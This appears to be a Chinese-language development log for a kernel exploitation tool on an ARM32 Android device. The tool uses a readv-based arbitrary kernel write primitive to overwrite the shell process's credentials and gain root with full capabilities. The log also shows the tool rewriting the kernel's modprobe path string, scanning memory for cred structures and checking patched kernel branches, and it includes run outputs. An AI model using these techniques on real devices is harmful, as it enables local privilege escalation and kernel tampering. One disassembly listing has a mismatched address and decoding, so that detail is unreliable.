## 零、最重要的发现：写原语是"逐条 iovec"落地，大长度不可靠

做 B4 时先把 `do_root` 的 6 次小写改成一次 72 字节整段写，结果 promote 开始失败：

```
task=cf7f2ec0 cred=d60a0480
! 写 0xd60a0484（72 字节）失败
  用快照回滚... 已还原
```

rollback 却成功——这不合常理，于是加了 `wtest`（在本进程自己的 cred 上翻一个字节、
写、读回看变没变、再还原）来定位。实测每次独立一次 `kwrite`：

| len | 全落地 | 说明 |
|---|---|---|
| 8 | **5/5** | 只有 1 条 iovec 条目 |
| 16 | 1/5 | |
| 32 | 0/5 | |
| 48 | 0/5 | |
| 72 | 1/5 | |

**关键点：`kwrite` 永远返回 0**（readv 本身没错），所以
`kwrite_verify_buf` 的"写后读回比对"是唯一能发现没落地的办法。
大长度写要靠重试凑齐所有条目同时落地，概率随条数指数下降。

这一条同时解释了为什么原代码用的是 4×8 字节 + 32 字节的小写——
不是风格，是唯一可行的写法。

**修改**：`kwrite_buf` 固定按 8 字节一块（不再用 `max_write`=4000），
`kt_write_rb`（do_root 用）同样按 8 字节逐块校验 + 失败按块回滚。
代价是批量写变慢（1MB 约 1 分钟），换来的是不再有"静默半改"。

顺带发现并修掉一个反汇编 bug：`f57ff05f`（DSB 屏障）被解成 `ldrb`。
原因是没有排除 `cond=1111` 的无条件指令空间。现在该空间除 BLX imm 外一律 `.word`。

## 一、B4 写事务

```
kwrite_txn / kt_write_rb
  ├─ 快照（kread_buf 原值）
  ├─ undo 日志 /data/local/tmp/ktool_undo.bin（magic+len+addr+data）
  ├─ 8 字节块逐块写 + 逐块 read-back 校验
  └─ 任一块 30 次重试仍失败 → 按块回滚已写部分 → 仍失败则提示 ktool undo
```

`do_root_inner` 从"6 次独立写"改为"72 字节整段 + 8 字节块 + 快照回滚"，
原来"caps 全满但 uid 没改"的半改状态不再可能留下。

实测（3/3）：

```
who: uid=2000 ...
promoted: uid=0 euid=0
who: uid=0 ... caps eff=ffffffff
unroot: uid=2000 euid=2000 gid=2000
caps: eff=00000000 perm=00000000 inh=00000000
```

`kwrite_file` + `undo` 回归（同样过了 8 字节块的新路径）：

```
before : /sbin/modprobe
written: /sbin/zzzzzz      ← 写入生效
undone : /sbin/modprobe    ← undo 精确还原
```

## 二、C6 `findcred`：按 cred 形状找对象

```
ktool findcred <start> <len> [-u uid] [max]
```

判据全部取自适配表 [B] 类偏移：`+off_cred_uid` 起 8 个 u32 全相等且 < 0x10000，
`+off_cred_caps` 处至少一组非零。另加两道降噪：

1. **cap 合法性**：ARM32 cap 位最多 36 位，所以两个字要么全 1（满 caps）
   要么高 4 位必须为 0；高 4 位非 0 的当指针排除；
2. **0x60 字节去重**：cred 至少 0x60 字节，落在上一个命中 0x60 之内的
   视为同一对象内部的位移错位，不重复报。

**诚实的结论：这是形状匹配，在整段内核镜像上必然有噪声**
（`.bss` 里大片 0 夹个小数值就能凑出形状，实测 8KB 范围 6 个命中）。
真正可用的方式是 `-u <uid>` 限定——`-u 2000` 找 shell 的 cred、
`-u 0` 找系统 cred。适合扫"已经知道大概在哪一页"的小范围。

## 三、C8 `fld` / `dis`

### `fld`：一行的 struct template

```
ktool fld <addr> <off:type>...
  type: p 指针(带符号标注) u u32 h u16 b u8 s 字符串 x hex4
```

实测：

```
$ ktool fld 0xc0b79be0 0x304:s 0x2f8:p 0x2fc:p 0x0:u
  +0x304 s  "swapper/0"
  +0x2f8 p  0xc0b9f1dc  Dinit_cred+0x0
  +0x2fc p  0xc0b9f1dc  Dinit_cred+0x0
  +0x000 u  0 (0x0)
```

### `dis`：ARM32 最小反汇编

```
ktool dis <addr> [n<=64]
```

只解"验证补丁点"需要的编码：B/BL/BLX、BX/BLX reg、SVC、MOVW/MOVT、
立即数/寄存器形式数据处理、LDR/STR（pc 相对直接算出目标）、PUSH/POP、LDM/STM。
**解不出来的一律 `.word`，绝不猜。**

实测：

```
$ ktool dis 0xc0064428 8
c0064428  e1a0c00d  mov r12, sp
c006442c  e92ddff0  push {r4,r5,r6,r7,r8,r9,r10,r11,r12,lr,pc}
c0064430  e24cb004  sub r11, r12, #0x4
c0064434  e24dd00c  sub sp, sp, #0xc
c0064438  e1a08000  mov r8, r0
c006443c  e1a04001  mov r4, r1
c0064440  e1a06002  mov r6, r2
c0064444  f57ff05f  .word 0xf57ff05f        ← dsb，拒绝猜

$ ktool dis 0xc0012164 3
c0012164  ea000047  b 0xc0012288            ← 当前是打补丁后的 beq→b
c0012168  e5932008  ldr r2, [r3, #0x8]
c0064434  e24dd00c  cmp r2, #0x0
```

对"验证 `exec_br` 补丁点当前到底是什么指令"这种活，不用再回 PC 了。

## 四、D9 / D10 / D11

| 项 | 做法 | 实测 |
|---|---|---|
| D9 超时 | `ktool -t <秒> <命令>...`，写最前面，dispatch 每次重置预算 | `-t 1` 扫 16MB 在 ~0xc0c75f7c 提前收手（不扫完） |
| D10 read 上限 | `dump` 仍 4096（hex 没人看），`read` 放到 16MB | `read 0xc0b79be0 8192` → 8192 字节文件 |
| D11 续传 | `kread_file <addr> <len> <out> -r`：按已存在长度跳过 | 32B + resume → 64B，与一次读全量逐字节一致 |
| D11 历史 | REPL 内 `history` / `!N` 回放，16 条去重 | `history` 列出 1 条；`!2` 重放 fld 成功 |

Tab 补全没做：交互式 adb shell 本身没有 readline，价值低。

## 五、B5 为什么不做

`root`/`sh`/`x` 在会话里会 exec 并结束会话——**这不是缺陷，是正确的语义**：

- `root <cmd>` 的契约就是"提权后执行这条命令"，exec 是唯一正确实现；
- 要"留在会话里继续用"，已有 `promote`（只改 cred 不 exec）；
- 若改成 fork，子进程的提权影响不到父进程，反而丢掉"后续命令持续 root"的能力；
- 唯一损失是 `root` 之后拿不到会话控制权，而这用 `promote` + 单独跑命令完全可替代。
